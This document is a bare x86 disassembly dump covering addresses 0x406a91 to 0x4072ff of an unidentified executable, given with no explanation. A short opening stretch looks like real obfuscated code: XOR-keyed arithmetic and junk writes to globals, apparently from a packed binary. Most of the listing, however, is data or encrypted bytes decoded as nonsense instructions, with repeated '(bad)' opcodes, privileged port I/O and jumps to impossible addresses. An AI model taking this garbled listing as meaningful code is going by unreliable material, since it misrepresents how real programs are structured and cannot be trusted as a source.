  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x69ee485f
  406b85:	adc    eax,DWORD PTR [edx]
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0xb07e7e7f
  406b8f:	ret    0x9ac8
  406b92:	dec    esi
  406b93:	or     ch,BYTE PTR [edi-0x7c00f1f1]
  406b99:	movzx  edi,BYTE PTR [ecx-0x66]
  406b9d:	push   ebx
  406b9e:	call   0x9a19fda0
  406ba3:	imul   DWORD PTR [edi+0x14]
  406ba6:	jge    0x406b73
  406ba8:	inc    ebx
  406ba9:	mov    BYTE PTR [eax-0x5e],dh
  406bac:	sahf   
  406bad:	psubsb mm5,mm5
  406bb0:	mov    ebx,0x5f224fbd
  406bb5:	sbb    cl,bh
  406bb7:	mov    ecx,0x86da9beb
  406bbc:	xlat   BYTE PTR ds:[ebx]
  406bbd:	sar    DWORD PTR [ebp-0x438f25bb],0x89
  406bc4:	inc    edi
  406bc5:	test   eax,0x8896d1c9
  406bca:	jmp    0x347234d8
  406bcf:	mov    bh,0x1a
  406bd1:	lahf   
  406bd2:	loope  0x406be8
  406bd4:	aad    0xe3
  406bd6:	mov    ebp,0x85503e23
  406bdb:	inc    edi
  406bdc:	stos   DWORD PTR es:[edi],eax
  406bdd:	daa    
  406bde:	or     ebp,ebp
  406be0:	mov    ecx,0xd4e15861
  406be5:	inc    eax
  406be6:	shl    DWORD PTR ds:0x32bd4462,0x8f
  406bed:	(bad)  
  406bee:	sar    edx,0x78
  406bf1:	xor    BYTE PTR [ebx+0x201ed358],0xbc
  406bf8:	jge    0x406c6d
  406bfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bfb:	addr16 sbb al,0x3d
  406bfe:	gs mov ebx,0xf190cbe0
  406c04:	pusha  
  406c05:	sbb    ecx,esi
  406c07:	inc    ecx
  406c08:	stos   DWORD PTR es:[edi],eax
  406c09:	ficomp DWORD PTR [edx-0x4c45bb7d]
  406c0f:	pop    ds
  406c10:	mov    cl,0x9c
  406c12:	das    
  406c13:	jbe    0x406c31
  406c15:	xor    DWORD PTR [eax],0xe07577cb
  406c1b:	bnd ret 
  406c1d:	mov    bh,0x76
  406c1f:	sub    eax,edi
  406c21:	or     ecx,DWORD PTR [ebx-0x6ffac3a0]
  406c27:	xor    DWORD PTR [ecx-0x7a],edx
  406c2a:	gs adc eax,0xc413bc65
  406c30:	pop    ebp
  406c31:	ret    0x7cc0
  406c34:	aaa    
  406c35:	cdq    
  406c36:	stos   DWORD PTR es:[edi],eax
  406c37:	push   esp
  406c38:	dec    eax
  406c39:	xchg   esi,eax
  406c3a:	xchg   esp,eax
  406c3b:	push   ds
  406c3c:	mov    eax,ds:0xb0eed0b4
  406c41:	rcr    BYTE PTR es:[eax-0x682e776f],0xb3
  406c49:	dec    esi
  406c4a:	leave  
  406c4b:	mov    WORD PTR [ecx-0x1d],es
  406c4e:	les    esp,FWORD PTR [esi+0x3b61043a]
  406c54:	dec    ecx
  406c55:	push   ds
  406c56:	push   ds
  406c57:	sar    BYTE PTR [ebx+0x49bad4c3],0xe0
  406c5e:	mov    ds:0x70257452,eax
  406c63:	rcl    eax,0x7b
  406c66:	test   al,0x8c
  406c68:	or     dh,ah
  406c6a:	call   0xd0e0:0x99ad8300
  406c71:	cli    
  406c72:	fidivr WORD PTR [eax+0xd]
  406c75:	in     al,0x46
  406c77:	mov    edx,0x61f7e794
  406c7c:	stos   DWORD PTR es:[edi],eax
  406c7d:	push   ss
  406c7e:	xchg   esi,eax
  406c7f:	rcr    ebx,1
  406c81:	mov    ?,WORD PTR [edi+0x22485999]
  406c87:	inc    esp
  406c88:	ret    
  406c89:	or     eax,0x4545149e
  406c8e:	and    al,0xc1
  406c90:	inc    ebp
  406c91:	retf   0x6c59
  406c94:	into   
  406c95:	icebp  
  406c96:	scas   al,BYTE PTR es:[edi]
  406c97:	xadd   BYTE PTR [ebx+0x61],al
  406c9b:	jo     0x406c87
  406c9d:	(bad)  
  406c9f:	repnz jmp FWORD PTR [ebx+0x33]
  406ca3:	dec    BYTE PTR [edx-0x7a9a6a71]
  406ca9:	xchg   edi,eax
  406caa:	dec    ebx
  406cab:	adc    al,0x28
  406cad:	or     BYTE PTR [esi-0x7438e0d1],ah
  406cb3:	push   ebp
  406cb4:	jno    0x406d05
  406cb6:	aam    0xe3
  406cb8:	leave  
  406cb9:	ins    DWORD PTR es:[edi],dx
  406cba:	or     al,0x6a
  406cbc:	or     edi,esp
  406cbe:	lods   eax,DWORD PTR ds:[esi]
  406cbf:	push   ss
  406cc0:	std    
  406cc1:	lods   al,BYTE PTR ds:[esi]
  406cc2:	mov    ah,0x53
  406cc4:	push   ss
  406cc5:	mov    edx,0xf22e0b6c
  406cca:	ins    DWORD PTR es:[edi],dx
  406ccb:	xchg   ebp,eax
  406ccc:	mov    edx,0x7f3fde3b
  406cd1:	ret    
  406cd2:	es cwde 
  406cd4:	pop    edi
  406cd5:	pusha  
  406cd6:	mov    esi,0x502b151
  406cdb:	push   edi
  406cdc:	lock pop es
  406cde:	arpl   WORD PTR [ecx+0x6d],si
  406ce1:	or     ebx,DWORD PTR [edi-0x4c9b7c01]
  406ce7:	jo     0x406cfa
  406ce9:	std    
  406cea:	jmp    0x854fa681
  406cef:	fcomp  DWORD PTR [edi]
  406cf1:	repz or edi,DWORD PTR [edi-0xc]
  406cf5:	mov    eax,ds:0x247636ad
  406cfa:	inc    edx
  406cfb:	leave  
  406cfc:	pop    ebp
  406cfd:	jmp    0x6844936e
  406d02:	aaa    
  406d03:	ror    DWORD PTR [esi-0x3d],1
  406d06:	push   cs
  406d07:	rcl    DWORD PTR [ebp+0xf],cl
  406d0a:	jl     0x406cdd
  406d0c:	jae    0x406d86
  406d0e:	dec    bl
  406d10:	sbb    BYTE PTR [ebp+0x7f5ed28b],0x8b
  406d17:	imul   esi,DWORD PTR ds:0x9d9d7510,0xffffffa6
  406d1e:	mov    ch,0x30
  406d20:	sbb    DWORD PTR [esi+0x10],0x45
  406d24:	pop    ebp
  406d25:	xor    eax,0x7b9b788c
  406d2a:	push   0xffffff97
  406d2c:	sysenter 
  406d2e:	(bad)  
  406d2f:	mov    al,ds:0xa18c9605
  406d34:	out    0x41,al
  406d36:	mov    al,ds:0xec304909
  406d3b:	inc    esi
  406d3c:	and    DWORD PTR [ebp+0x4b5f496a],0x69
  406d43:	pop    ebp
  406d44:	scas   eax,DWORD PTR es:[edi]
  406d45:	and    eax,0xff30ddf6
  406d4a:	popf   
  406d4b:	ds jp  0x406dc9
  406d4e:	mov    dl,0x20
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43382f,0x433713
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433823,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433763,0x43370f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x82
  406d91:	imul   edx,DWORD PTR [ebx+0x7e3840c7],0x7e7fbc7e
  406d9b:	jle    0x406d4a
  406d9d:	adc    edx,DWORD PTR [edx-0x17]
  406da0:	pop    esi
  406da1:	inc    edi
  406da2:	inc    ecx
  406da3:	hlt    
  406da4:	pop    edx
  406da5:	mov    bh,0x76
  406da7:	pop    ss
  406da8:	cmp    ch,BYTE PTR [ebp+0x62f922f]
  406dae:	xchg   edi,eax
  406daf:	cmc    
  406db0:	jno    0x406dcc
  406db2:	mov    BYTE PTR [edi-0x4e],dh
  406db5:	dec    ebx
  406db6:	(bad)  
  406db7:	daa    
  406db8:	in     eax,0xdd
  406dba:	add    BYTE PTR [eax+eiz*2],ch
  406dbd:	xor    edi,edi
  406dbf:	pop    ds
  406dc0:	inc    ebp
  406dc1:	ficomp DWORD PTR [ebx-0x3b]
  406dc4:	add    cl,dh
  406dc6:	(bad)  
  406dc7:	aaa    
  406dc8:	pop    DWORD PTR ds:0x1f59ee6a
  406dce:	push   esi
  406dcf:	into   
  406dd0:	xchg   ecx,eax
  406dd1:	pop    ss
  406dd2:	out    dx,eax
  406dd3:	pop    esp
  406dd4:	push   edx
  406dd5:	cmp    eax,0x8b18ce80
  406dda:	inc    esi
  406ddb:	adc    BYTE PTR [esi],dl
  406ddd:	cs pop edi
  406ddf:	imul   DWORD PTR [ecx-0x7d60238c]
  406de5:	pop    ss
  406de6:	repz dec esp
  406de8:	mov    ebx,DWORD PTR [ecx+0x35]
  406deb:	mov    eax,0x95b06c1b
  406df0:	pop    esp
  406df1:	call   0xf30a629c
  406df6:	jmp    0xd824:0xb2c2a5de
  406dfd:	mov    ch,0x3
  406dff:	mov    edx,0x306857da
  406e04:	aam    0x27
  406e06:	lods   al,BYTE PTR ds:[esi]
  406e07:	addr16 adc eax,0x23c065b8
  406e0d:	adc    eax,0xf4908371
  406e12:	cmp    DWORD PTR ss:[eax-0x577ad2da],0xfff972a1
  406e1d:	hlt    
  406e1e:	mov    ds:0x4e1add82,al
  406e23:	scas   al,BYTE PTR es:[edi]
  406e24:	mov    al,0x4d
  406e26:	pusha  
  406e27:	xchg   ebp,eax
  406e28:	int    0x43
  406e2a:	out    0x3,eax
  406e2c:	mov    ebp,0xa49a9b53
  406e31:	push   ecx
  406e32:	add    DWORD PTR [ecx],esi
  406e34:	sbb    dh,al
  406e36:	ret    0x2670
  406e39:	adc    edx,DWORD PTR [eax]
  406e3b:	xchg   edi,eax
  406e3c:	xchg   edi,eax
  406e3d:	push   es
  406e3e:	je     0x406df7
  406e40:	jno    0x406e4c
  406e42:	aam    0xd2
  406e44:	push   ss
  406e45:	das    
  406e46:	inc    esp
  406e47:	and    eax,0x44f5c457
  406e4c:	scas   al,BYTE PTR es:[edi]
  406e4d:	stc    
  406e4e:	ss xor eax,0x5c4ac479
  406e54:	sub    al,0xe3
  406e56:	sub    BYTE PTR ds:[esi],dl
  406e59:	ja     0x406eba
  406e5b:	cmp    ch,BYTE PTR [ecx]
  406e5d:	cwde   
  406e5e:	cmp    edx,DWORD PTR [ecx]
  406e60:	sbb    esi,DWORD PTR [ebx-0x116b1a5d]
  406e66:	out    dx,eax
  406e67:	ins    DWORD PTR es:[edi],dx
  406e68:	ret    0x3e09
  406e6b:	and    DWORD PTR [esi+esi*2+0x2a],eax
  406e6f:	f2xm1  
  406e71:	(bad)  
  406e72:	jmp    0x406e5a
  406e74:	push   eax
  406e75:	sbb    DWORD PTR [eax],0x64
  406e78:	ins    BYTE PTR es:[edi],dx
  406e79:	mov    ds:0x9ee06723,al
  406e7e:	ror    esi,cl
  406e80:	js     0x406e59
  406e82:	out    0x56,al
  406e84:	pusha  
  406e85:	mov    edi,0xba833efb
  406e8a:	call   0xda69224f
  406e8f:	push   eax
  406e90:	and    bh,dl
  406e92:	jae    0x406eba
  406e94:	test   eax,0x8535211b
  406e99:	arpl   si,bp
  406e9b:	inc    edi
  406e9c:	inc    eax
  406e9d:	push   es
  406e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e9f:	sti    
  406ea0:	out    dx,eax
  406ea1:	aad    0x5
  406ea3:	cdq    
  406ea4:	aam    0x2c
  406ea6:	gs stc 
  406ea8:	cmp    bh,BYTE PTR ds:0x9716b79a
  406eae:	sbb    edx,eax
  406eb0:	push   ds
  406eb1:	adc    eax,0x9235ece3
  406eb6:	aas    
  406eb7:	imul   BYTE PTR [esi]
  406eb9:	mov    ecx,0x371af20b
  406ebe:	loope  0x406ec8
  406ec0:	imul   BYTE PTR [ebp-0x716f9dc8]
  406ec6:	pop    ss
  406ec7:	adc    eax,0x5a5286af
  406ecc:	fisttp QWORD PTR [edx]
  406ece:	jae    0x406f1a
  406ed0:	fnstcw WORD PTR [edi+0x72]
  406ed3:	aas    
  406ed4:	xchg   esi,eax
  406ed5:	jmp    0x406e85
  406ed7:	mov    ss,edi
  406ed9:	mov    eax,ds:0xce6aeff3
  406ede:	sbb    edi,DWORD PTR [ebx+eiz*8]
  406ee1:	push   ss
  406ee2:	fist   DWORD PTR [ebp-0x77]
  406ee5:	inc    ebp
  406ee6:	lock fs enter 0xba69,0x77
  406eec:	cmp    eax,0x8bd69786
  406ef1:	das    
  406ef2:	sbb    dh,BYTE PTR [eax-0x727202aa]
  406ef8:	jg     0x406f21
  406efa:	push   ds
  406efb:	das    
  406efc:	add    ah,BYTE PTR [ebp-0x2d2b1e82]
  406f02:	push   esp
  406f03:	sbb    ch,BYTE PTR [ecx]
  406f05:	loope  0x406ed1
  406f07:	push   esp
  406f08:	adc    esp,ebp
  406f0a:	(bad)  
  406f0b:	and    DWORD PTR [edx+0x4f],ecx
  406f0e:	jne    0x406f4f
  406f10:	mov    al,ds:0x27de81ce
  406f15:	jmp    0x69f0a5f4
  406f1a:	push   ebp
  406f1b:	push   ebx
  406f1c:	scas   eax,DWORD PTR es:[edi]
  406f1d:	mov    ds:0xb8ce63b6,al
  406f22:	pop    ecx
  406f23:	in     al,0x84
  406f25:	lock jbe 0x406ec9
  406f28:	add    eax,0x2331701c
  406f2d:	sub    ebx,DWORD PTR [ebp+0x454530ad]
  406f33:	mov    edx,0xbff444ae
  406f38:	test   eax,0x98731f8d
  406f3d:	or     dh,BYTE PTR [ebx]
  406f3f:	call   0x552:0xd6052554
  406f46:	out    0xa9,eax
  406f48:	icebp  
  406f49:	adc    DWORD PTR [esp+ecx*2],0xffffffaa
  406f4d:	int    0x9
  406f4f:	or     BYTE PTR [ebx-0x5a],0xae
  406f53:	sbb    BYTE PTR [eax+0x12e15d7b],0x32
  406f5a:	jb     0x406f1e
  406f5c:	call   0xf25:0x81d0f73e
  406f63:	aaa    
  406f64:	inc    ebx
  406f65:	add    BYTE PTR [ebx+0x37],dl
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x5c81fde8
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xf17e7e7f
  406f9f:	sar    al,1
  406fa1:	out    0x66,al
  406fa3:	inc    ebx
  406fa4:	pop    eax
  406fa5:	inc    esi
  406fa6:	fimul  WORD PTR [esi]
  406fa8:	ret    0xa020
  406fab:	arpl   WORD PTR [ecx-0x55],ax
  406fae:	mov    eax,ds:0x9bfba5b5
  406fb3:	lods   eax,DWORD PTR ds:[esi]
  406fb4:	gs sub ebp,eax
  406fb7:	fiadd  DWORD PTR [edx+0x4a]
  406fba:	(bad)  
  406fbb:	call   0xa626:0xdfdad96c
  406fc2:	sub    DWORD PTR [esi+0x37],0x1e
  406fc6:	ds into 
  406fc8:	loopne 0x407001
  406fca:	push   cs
  406fcb:	in     eax,dx
  406fcc:	(bad)  
  406fcd:	sbb    dl,cl
  406fcf:	pop    ecx
  406fd0:	jg     0x406f5d
  406fd2:	cwde   
  406fd3:	fidiv  DWORD PTR [ebp+0x2b19329]
  406fd9:	xchg   BYTE PTR [edi-0x369f86bb],cl
  406fdf:	mov    dh,0x57
  406fe1:	dec    esp
  406fe2:	cmp    DWORD PTR [eax-0x18da4b8f],edi
  406fe8:	(bad)  
  406fea:	hlt    
  406feb:	iret   
  406fec:	or     al,0x72
  406fee:	retf   0xffc6
  406ff1:	xor    DWORD PTR [edi],0x1a25518e
  406ff7:	out    0x1d,eax
  406ff9:	pop    ebx
  406ffa:	xor    DWORD PTR [ebp-0x12e3e510],edx
  407000:	test   BYTE PTR [ebx-0xd82ba9d],cl
  407006:	and    edi,ebp
  407008:	cld    
  407009:	sbb    eax,0xc3a8f9b0
  40700e:	lds    edi,FWORD PTR ds:0x356a659d
  407014:	clc    
  407015:	mov    eax,ds:0x64de40fb
  40701a:	pop    eax
  40701b:	and    bl,BYTE PTR [eax]
  40701d:	xchg   ecx,eax
  40701e:	xor    ecx,esp
  407020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407021:	dec    ecx
  407022:	iret   
  407023:	push   ecx
  407024:	cli    
  407025:	pop    ecx
  407026:	push   cs
  407027:	xor    al,0xc3
  407029:	dec    eax
  40702a:	(bad)
  40702e:	pop    esp
  40702f:	out    0x76,al
  407031:	adc    al,0xc4
  407033:	add    DWORD PTR [ebx],ebp
  407035:	das    
  407036:	adc    DWORD PTR [ecx+0x2b74c2a],ebp
  40703c:	in     eax,0x57
  40703e:	inc    ebx
  40703f:	shl    BYTE PTR [esi],1
  407041:	sti    
  407042:	fcomp  st(1)
  407044:	xchg   esp,eax
  407045:	dec    edi
  407046:	mov    WORD PTR [edx],ss
  407048:	movq   mm0,QWORD PTR [esi]
  40704b:	dec    esp
  40704c:	test   eax,0xff8676da
  407051:	mov    DWORD PTR gs:[ecx],0x4735c61f
  407058:	out    dx,eax
  407059:	sbb    al,0xd2
  40705c:	mov    ds:0xc9235a8c,al
  407061:	mov    al,ds:0xcf7ced9
  407066:	push   ebp
  407067:	call   0xe278e196
  40706c:	and    eax,0xf7c54e35
  407071:	lds    ebp,FWORD PTR [esi-0xde9c764]
  407077:	sbb    BYTE PTR [ecx-0x6acb6f48],bh
  40707d:	push   ecx
  40707e:	and    DWORD PTR [ecx],ebx
  407080:	cmp    bl,BYTE PTR [eax+eiz*2-0x51]
  407084:	xor    ecx,DWORD PTR [edi-0xdf3c4c3]
  40708a:	sbb    BYTE PTR [ecx],0x68
  40708d:	cmp    DWORD PTR [ebp-0x1f4cc592],esi
  407093:	stos   BYTE PTR es:[edi],al
  407094:	xlat   BYTE PTR ds:[ebx]
  407095:	cs xor al,0x64
  407098:	push   ds
  407099:	popf   
  40709a:	inc    ebx
  40709b:	aas    
  40709c:	call   FWORD PTR [ebx]
  40709e:	cmc    
  40709f:	pusha  
  4070a0:	hlt    
  4070a1:	jp     0x407068
  4070a3:	xchg   ecx,eax
  4070a4:	sub    eax,0xf34a4dd9
  4070a9:	sbb    BYTE PTR [edx+0x3a0be8dd],dh
  4070af:	mov    cl,0xd0
  4070b1:	sti    
  4070b2:	fstp   TBYTE PTR [ebx+0x66034690]
  4070b8:	loop   0x407083
  4070ba:	aas    
  4070bb:	jns    0x40711d
  4070bd:	rcr    BYTE PTR [ecx-0x21],0x5e
  4070c1:	ret    0x4a1e
  4070c4:	mov    BYTE PTR [ebx-0x13],bh
  4070c7:	push   ebx
  4070c8:	mov    esi,0x87f178b7
  4070cd:	pusha  
  4070ce:	sbb    al,0x15
  4070d0:	ror    edx,cl
  4070d2:	sub    al,0x65
  4070d4:	pop    ds
  4070d5:	and    ah,BYTE PTR [ebp-0x3d]
  4070d8:	cs nop
  4070da:	push   eax
  4070db:	mov    ebp,0xadb8dce2
  4070e0:	xchg   edi,eax
  4070e1:	add    DWORD PTR [edi],0x672f8294
  4070e7:	ds mov ebx,0xd3262da6
  4070ed:	retf   
  4070ee:	adc    al,0x9c
  4070f0:	(bad)  
  4070f2:	jg     0x407111
  4070f4:	sbb    eax,0x1e119907
  4070f9:	dec    ebp
  4070fa:	pop    ss
  4070fb:	mov    ebp,DWORD PTR [esi-0x5b49add5]
  407101:	cmp    al,BYTE PTR [edi-0x6125143c]
  407107:	jge    0x4070a3
  407109:	mov    dh,0xf1
  40710b:	retf   0x6868
  40710e:	loopne 0x407096
  407110:	add    al,0x34
  407112:	or     al,0x52
  407114:	sub    eax,0x4ea93bd7
  407119:	ss sbb al,0xfc
  40711c:	mov    WORD PTR ds:0x4e73c2e6,es
  407122:	je     0x407121
  407124:	scas   eax,DWORD PTR es:[edi]
  407125:	leave  
  407126:	or     BYTE PTR [ebp-0x7b],0x81
  40712a:	test   WORD PTR [edx+0x42a1031c],0x875c
  407133:	sub    al,0x6d
  407135:	push   ss
  407136:	xor    BYTE PTR [ebx+0x1a],ah
  407139:	(bad)  
  40713a:	jb     0x407140
  40713c:	sbb    al,0x6f
  40713e:	adc    al,0x5
  407140:	fsubr  DWORD PTR [edx+0x4680cdf9]
  407146:	sbb    eax,DWORD PTR [esp+ebx*2-0x1]
  40714a:	or     BYTE PTR [ecx+esi*1-0x26],al
  40714e:	jne    0x407189
  407150:	imul   edx,DWORD PTR [ebp-0x51087311],0x31b54f6a
  40715a:	aaa    
  40715b:	(bad)  
  40715c:	pop    edx
  40715d:	mulps  xmm5,XMMWORD PTR [eax-0x1]
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	mov    eax,ds:0xcc2a7369
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x7f7e7e7f
  407188:	in     al,dx
  407189:	out    0xaa,al
  40718b:	pop    edi
  40718c:	cli    
  40718d:	add    eax,0xcd8eb74
  407192:	jns    0x40719f
  407194:	fdivr  DWORD PTR [edi+0x5415da64]
  40719a:	push   edx
  40719b:	sbb    cl,BYTE PTR [esi+0x39]
  40719e:	into   
  40719f:	ss xchg edx,eax
  4071a1:	sbb    eax,0xe17dd0bc
  4071a6:	and    ch,cl
  4071a8:	jecxz  0x4071b8
  4071aa:	add    esp,eax
  4071ac:	in     al,0x3c
  4071ae:	rcl    BYTE PTR [ebx],cl
  4071b0:	jmp    0xee982e62
  4071b5:	in     al,dx
  4071b6:	daa    
  4071b7:	call   0xc8af:0x3c2af623
  4071be:	aas    
  4071bf:	jns    0x407235
  4071c1:	xchg   edi,eax
  4071c2:	ss jle 0x407196
  4071c5:	cld    
  4071c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071c7:	push   edi
  4071c8:	add    DWORD PTR [esi+eiz*4],edx
  4071cb:	xor    BYTE PTR [edx+0x9bfba3c],cl
  4071d1:	cmp    al,0x90
  4071d3:	int3   
  4071d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071d5:	shl    DWORD PTR [edi+0x1547abc2],cl
  4071db:	push   0xffffffc3
  4071dd:	push   ss
  4071de:	ret    0xd644
  4071e1:	xchg   esp,eax
  4071e2:	mov    edi,0x9c2fff0c
  4071e7:	cmp    DWORD PTR [edx-0x74],esp
  4071ea:	in     eax,dx
  4071eb:	xchg   edx,eax
  4071ec:	rol    DWORD PTR [edi+0x4fea9fd],cl
  4071f2:	enter  0xa61f,0x8c
  4071f6:	jecxz  0x4071cc
  4071f8:	xchg   BYTE PTR [edi-0x20],bh
  4071fb:	dec    ebp
  4071fc:	imul   DWORD PTR [ecx]
  4071fe:	cmp    eax,0xec80aee3
  407203:	xlat   BYTE PTR ds:[ebx]
  407204:	scas   eax,DWORD PTR es:[edi]
  407205:	rol    DWORD PTR [ecx],1
  407207:	and    ecx,DWORD PTR [ecx-0x29df3223]
  40720d:	cld    
  40720e:	pop    esi
  40720f:	mov    esp,0xdfb6bc32
  407214:	mov    al,0xe9
  407216:	adc    DWORD PTR [ebp-0x5305bc5b],0x10
  40721d:	push   edi
  40721e:	(bad)  
  40721f:	ins    DWORD PTR es:[edi],dx
  407220:	inc    ebx
  407221:	xchg   cl,cl
  407223:	push   eax
  407224:	jl     0x407257
  407226:	inc    ebx
  407227:	mov    dl,0x6a
  407229:	push   edx
  40722a:	mov    esp,0x304dd7ea
  40722f:	das    
  407230:	les    esi,FWORD PTR [ecx-0x31c468d4]
  407236:	pop    ds
  407237:	mov    ah,0xd5
  407239:	push   ebp
  40723a:	sbb    edx,0xffffffe2
  40723d:	into   
  40723e:	mov    BYTE PTR [ebx+0x17],cl
  407241:	mov    ch,0x6e
  407243:	and    bl,0x6a
  407246:	lods   eax,DWORD PTR ds:[esi]
  407247:	xchg   esp,eax
  407248:	sbb    al,0xd0
  40724a:	xor    al,0xc3
  40724c:	cmp    al,BYTE PTR [ebx-0x22]
  40724f:	imul   eax,DWORD PTR [ecx],0xa63ccdb
  407255:	outs   dx,BYTE PTR ds:[esi]
  407256:	cmp    edi,0x72dfd94d
  40725c:	mov    eax,ds:0xad63ea51
  407261:	adc    ebp,DWORD PTR [ebx-0x4c27d0a4]
  407267:	fs mov ah,0xaf
  40726a:	data16 ud2 
  40726d:	xor    al,0x25
  40726f:	jbe    0x40724c
  407271:	cmp    DWORD PTR [edx],ebx
  407273:	cmp    eax,0x98c8b98f
  407278:	mov    dl,0x0
  40727a:	(bad)  
  40727b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40727c:	or     al,0xa1
  40727e:	in     al,0x18
  407280:	loopne 0x407236
  407282:	(bad)  
  407283:	xchg   edi,eax
  407284:	mov    ds:0x60e27465,al
  407289:	sbb    ebx,edi
  40728b:	dec    edx
  40728c:	adc    BYTE PTR gs:[ebx+ebp*4+0x1f],cl
  407291:	in     al,0x28
  407293:	xchg   edi,eax
  407294:	adc    DWORD PTR [edx+0x67],esi
  407297:	stos   DWORD PTR es:[edi],eax
  407298:	add    al,BYTE PTR [esi-0x237f6cfc]
  40729e:	neg    WORD PTR cs:[ebx]
  4072a2:	cmp    DWORD PTR [eax+0x34],ebp
  4072a5:	push   ebp
  4072a6:	out    dx,al
  4072a7:	(bad)  
  4072a8:	mov    edx,0x92af9f91
  4072ad:	ins    BYTE PTR es:[edi],dx
  4072ae:	leave  
  4072af:	aas    
  4072b0:	jno    0x407287
  4072b2:	(bad)  
  4072b3:	push   esi
  4072b4:	add    al,0x3b
  4072b6:	sbb    al,BYTE PTR [eax-0x1d6b49e3]
  4072bc:	sahf   
  4072bd:	and    ebp,ebp
  4072bf:	xchg   BYTE PTR [edx-0x6b195819],bh
  4072c5:	adc    esi,DWORD PTR [ebp+0x5c]
  4072c8:	lods   al,BYTE PTR ds:[esi]
  4072c9:	sub    DWORD PTR [ebx+0x67],eax
  4072cc:	cmc    
  4072cd:	sub    ah,BYTE PTR [ebx+ecx*8]
  4072d0:	and    ebx,DWORD PTR [esi-0x7d0ae609]
  4072d6:	jb     0x407352
  4072d8:	ret    0x6b50
  4072db:	sub    eax,0xac741535
  4072e0:	jle    0x40731a
  4072e2:	mov    ds:0x4645cd60,eax
  4072e7:	pop    ebp
  4072e8:	mov    eax,DWORD PTR [esi]
  4072ea:	je     0x4072cd
  4072ec:	ja     0x40732a
  4072ee:	xor    ebp,edx
  4072f0:	fwait
  4072f1:	mov    esp,DWORD PTR [edx-0x75217fd7]
  4072f7:	adc    DWORD PTR [edx-0x59],esp
  4072fa:	lods   eax,DWORD PTR ds:[esi]
  4072fb:	lock adc bh,BYTE PTR [edx+0x4f]
  4072ff:	jmp    0xd20c3a71
